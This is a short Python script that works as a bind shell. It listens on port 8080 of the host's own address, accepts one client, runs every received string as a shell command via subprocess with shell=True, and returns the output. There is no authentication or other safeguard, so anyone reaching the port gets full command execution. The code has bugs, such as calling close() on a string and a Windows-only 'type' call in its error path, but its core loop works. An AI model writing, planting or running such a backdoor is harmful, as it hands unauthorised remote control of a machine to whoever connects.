import os 
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
a = socket.gethostbyname(socket.gethostname())
print(a)
s.bind((str(a), 8080))

s.listen(2)

(clientsocket, address) = s.accept()

def main():
    global command
    while True:
        command = clientsocket.recv(2048).decode()
        if command == "exit":
            command.close()
            s.close()
            exit()
        else:
            print(command)
            command = str(command)
            result = subprocess.check_output(command, shell=True)
            result = result.decode('utf-8')
            print(result)
            if result == "":
                wd = command.replace('cd', "")
                os.chdir(f"{wd.strip()}")
                result = subprocess.check_output("echo directory changed", shell=True)
                print(result)
                clientsocket.send(result)
            else:
                result = result.encode()
                clientsocket.send(result)


try :
    main()
except Exception as err:
    with open('error.txt', 'w') as f:
        aerror = f'''{command} is not recognized as an internal or external command,
                operable program or batch file.
                And the error is :-
                    {err}'''
        f.write(aerror)
    error = subprocess.check_output('type error.txt', shell=True)
    clientsocket.send(error)
    main()
    